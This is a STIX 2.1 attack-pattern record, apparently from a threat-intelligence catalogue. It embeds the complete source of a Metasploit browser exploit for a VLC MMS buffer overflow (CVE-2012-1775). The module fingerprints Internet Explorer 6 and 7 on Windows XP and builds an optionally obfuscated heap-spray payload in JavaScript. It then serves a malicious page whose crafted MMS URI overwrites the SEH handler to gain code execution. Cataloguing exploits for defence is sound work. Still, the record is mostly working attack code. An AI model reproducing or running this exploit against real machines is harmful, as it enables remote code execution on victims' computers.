{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa41e60f-6240-4a48-8347-9616672a02da",
    "created": "2024-08-14T16:44:14.239343Z",
    "modified": "2024-08-14T16:44:14.239347Z",
    "name": "\"VLC MMS Stream Handling Buffer Overflow\"",
    "description": " This module exploits a buffer overflow in VLC media player VLC media player prior to 2.0.0. The vulnerability is due to a dangerous use of sprintf which can result in a stack buffer overflow when handling a malicious MMS URI.  This module uses the browser as attack vector. A specially crafted MMS URI is used to trigger the overflow and get flow control through SEH overwrite. Control is transferred to code located in the heap through a standard heap spray.  The module only targets IE6 and IE7 because no DEP/ASLR bypass has been provided.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/vlc_mms_bof.rb",
            "external_id": "vlc_mms_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1775"
        },
        {
            "source_name": "reference",
            "url": "http://www.videolan.org/security/sa1201.html"
        },
        {
            "source_name": "reference",
            "url": "http://git.videolan.org/?p=vlc/vlc-2.0.git;a=commit;h=11a95cce96fffdbaba1be6034d7b42721667821c"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"VLC MMS Stream Handling Buffer Overflow\",\n      'Description' => %q{\n          This module exploits a buffer overflow in VLC media player VLC media player prior\n        to 2.0.0. The vulnerability is due to a dangerous use of sprintf which can result\n        in a stack buffer overflow when handling a malicious MMS URI.\n\n        This module uses the browser as attack vector. A specially crafted MMS URI is\n        used to trigger the overflow and get flow control through SEH overwrite. Control\n        is transferred to code located in the heap through a standard heap spray.\n\n        The module only targets IE6 and IE7 because no DEP/ASLR bypass has been provided.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      =>\n        [\n          'Florent Hochwelker', # aka TaPiOn, Vulnerability discovery\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References' =>\n        [\n          ['CVE', '2012-1775'],\n          ['OSVDB', '80188'],\n          ['URL', 'http://www.videolan.org/security/sa1201.html'],\n          # Fix commit diff\n          ['URL', 'http://git.videolan.org/?p=vlc/vlc-2.0.git;a=commit;h=11a95cce96fffdbaba1be6034d7b42721667821c']\n        ],\n      'Payload' =>\n        {\n          'BadChars'        => \"\\x00\",\n          'Space'           => 1000,\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          # Tested with VLC 2.0.0\n          [ 'Automatic', {} ],\n          [\n            'Internet Explorer 6 on XP SP3',\n            {\n              'Rop' => false,\n              # Space needed to overflow and generate an exception\n              # which allows to get control through SEH overwrite\n              'Offset' => 5488,\n              'OffsetShell' => '0x800 - code.length',\n              'Blocks' => '1550',\n              'Padding' => '0'\n            }\n          ],\n          [\n            'Internet Explorer 7 on XP SP3',\n            {\n              'Rop' => false,\n              # Space needed to overflow and generate an exception\n              # which allows to get control through SEH overwrite\n              'Offset' => 5488,\n              'OffsetShell' => '0x800 - code.length',\n              'Blocks' => '1600',\n              'Padding' => '1'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-03-15',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(cli, request)\n    #Default target\n    my_target = target\n\n    vprint_status(\"User-Agent: #{request.headers['User-Agent']}\")\n\n    if target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        #Windows XP + IE 6\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        #Windows XP + 7.0\n        my_target = targets[2]\n      else\n        #If we don't recognize the client, we don't fire the exploit\n        my_target = nil\n      end\n    end\n\n    return my_target\n  end\n\n  def on_request_uri(cli, request)\n    #Pick the right target\n    my_target = get_target(cli, request)\n    if my_target.nil?\n      vprint_error(\"Target not supported\")\n      send_not_found(cli)\n      return\n    end\n\n    vprint_status(\"URL: #{request.uri.to_s}\")\n\n    #ARCH used by the victim machine\n    arch = Rex::Arch.endian(my_target.arch)\n    nops = Rex::Text.to_unescape(\"\\x0c\\x0c\\x0c\\x0c\", arch)\n    code = Rex::Text.to_unescape(payload.encoded, arch)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Spray overwrites 0x30303030 with our payload\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{code}\");\n    var #{randnop} = \"#{nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['OffsetShell']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var i=0; i < #{my_target['Blocks']}; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    #Use heaplib\n    js_spray = heaplib(spray)\n\n    #obfuscate on demand\n    if datastore['OBFUSCATE']\n      js_spray = ::Rex::Exploitation::JSObfu.new(js_spray)\n      js_spray.obfuscate(memory_sensitive: true)\n    end\n\n\n    src_ip = Rex::Socket.source_address.split('.')\n    hex_ip = src_ip.map { |h| [h.to_i].pack('C*')[0].unpack('H*')[0] }.join\n    # Try to maximize success on IE7 platform:\n    # If first octet of IP address is minor than 16 pad with zero\n    # even when heap spray could be not successful.\n    # Else pad following target heap spray criteria.\n    if ((hex_ip.to_i(16) >> 24) < 16)\n      padding_char = '0'\n    else\n      padding_char = my_target['Padding']\n    end\n\n    hex_ip = \"0x#{padding_char * my_target['Offset']}#{hex_ip}\"\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n      #{js_spray}\n    </script>\n    </head>\n    <body>\n    <OBJECT classid=\"clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921\"\n      codebase=\"http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab\"\n      width=\"320\"\n      height=\"240\"\n      id=\"vlc\" events=\"True\">\n      <param name=\"Src\" value=\"mms://#{hex_ip}:#{datastore['SRVPORT']}\" />\n      <param name=\"ShowDisplay\" value=\"True\" />\n      <param name=\"AutoLoop\" value=\"False\" />\n      <param name=\"AutoPlay\" value=\"True\" />\n      <EMBED pluginspage=\"http://www.videolan.org\"\n        type=\"application/x-vlc-plugin\" progid=\"VideoLAN.VLCPlugin.2\"\n        width=\"320\"\n        height=\"240\"\n        autoplay=\"yes\"\n        loop=\"no\"\n        target=\"mms://#{hex_ip}:#{datastore['SRVPORT']}\"\n        name=\"vlc\">\n      </EMBED>\n    </OBJECT>\n\n\n    </body>\n    </html>\n    EOS\n\n    #Remove extra tabs in HTML\n    html = html.gsub(/^ {4}/, \"\")\n\n    print_status(\"Sending malicious page\")\n    send_response( cli, html, {'Content-Type' => 'text/html'} )\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-03-15",
    "x_mitre_platforms": [
        "win'"
    ]
}